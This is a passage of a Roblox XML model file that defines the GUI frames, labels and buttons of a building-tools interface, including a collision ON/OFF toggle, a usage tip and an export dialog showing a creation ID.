											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXD59E177A2B2845EEB271E55F932F3594">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBX057FF37F990F407F84614FF342F7F938">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">ON</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX6F1F3CCF5DAC42AC897F0559D4CBCEA1">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Off</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>113</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXEFD474DB08C94E54A1B1FE915F59A300">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBXFB23FC3FC9844B898FDEBF1B92B9D5FE">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX4CBB7F7318154874B148B4222F5EA55B">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBX0A66786FD78544B49AFC8A316B05B85E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">OFF</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXC2DFFC8176024B069A00CFEFDD6C85C4">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Tip</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>70</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXCC7DA2205F8D4AA8B8A9CC371C07C0B2">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXCD2B188030874B6387B54CF097788840">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">3</token>
										<string name="Name">Text</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">TIP: Press Enter to quickly toggle collision.</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">11</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBXD1676F4F22E44B5199F6BD39F5A3B412">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4278190080</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTExportDialog</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>100</XO>
									<YS>0</YS>
									<YO>128</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>200</XO>
									<YS>0</YS>
									<YO>110</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBX43338DDAC53246618A03449B4D6DCC2E">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">true</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Info</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>75</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX7EE438B94B3E4E15A3D9D6A257CA7D38">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">6</token>
										<string name="Name">CreationIDLabel</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>5</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>40</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Your creation&apos;s ID:</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">18</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX90EC6E6098AA4C87A1CC67615873440C">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">7</token>
										<string name="Name">CreationID</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>40</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">j5of0</string>
										<Color3 name="TextColor3">4285558896</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">24</float>
										<Color3 name="TextStrokeColor3">4294967295</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX11200822292647F786A43D9F74860913">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX922ACDFF261942A1BC219983BAEDF671">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294946560</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Yellow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXB6623EA23D414565B9480FF30CC24016">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283144011</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Green</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX26BBFC91B721495DB2C7379971AAC289">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278497260</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Blue</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.400000006</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXF2804C9D97C746EAA32E6E0B0BC8DB84">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294901760</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Red</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.600000024</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX6728FB6B4FE04C208501957673BD0709">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4285215356</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Purple</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.800000012</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX96A65BB20A5E49B981D81B81DE9009F6">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Tip</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>75</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX5918313FBD3F45A19B9AAA8D18FD85E5">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
